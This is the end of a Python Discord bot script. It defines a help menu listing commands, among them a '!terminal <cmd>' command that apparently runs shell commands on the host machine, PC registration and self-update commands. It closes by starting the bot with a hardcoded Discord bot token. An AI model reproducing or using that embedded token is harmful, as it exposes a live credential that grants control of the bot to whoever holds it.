        value="`!kick <user>` | `!ban <user>` | `!addrole <user> <role>` | `!removerole <user> <role>`",
        inline=False
    )
    embed.add_field(
        name="📡 Network",
        value="`!pinghost <host>` | `!ipconfig` | `!pinggeo <host>` | `!extractlinks <url>`",
        inline=False
    )
    embed.add_field(
        name="💻 Terminal & Automation",
        value="`!terminal <cmd>` | `!openlink <url>` | `!googlesearch <query>` | `!registerpc <name>`",
        inline=False
    )
    embed.add_field(
        name="🧹 Cleanup",
        value="`!clearmessages` | `!clearbot` | `!clearcommands`",
        inline=False
    )
    embed.add_field(
        name="⚙️ Owner/Admin",
        value="`!shutdown` | `!restart` | `!setstatus <type> <text>` | `!pullupdate` | `!updatebot` | `!installpython` | `!installrequirements` | `!closechrome`",
        inline=False
    )
    embed.add_field(
        name="🔒 Whitelist",
        value="`!addwhitelist <user>` | `!removewhitelist <user>` | `!showwhitelist`",
        inline=False
    )
    embed.set_footer(text="Tip: Most commands start with ! • Some require admin/owner rights.")
    await ctx.send(embed=embed)
    
# ========== RUN BOT ==========
bot.run("MTQxNzAwNTk0ODYzOTM3OTQ1Ng.G_jQqs.hihlNK8yyCMKJ5Z_bQgm2y-cG8x3cFq1tBvrb0")
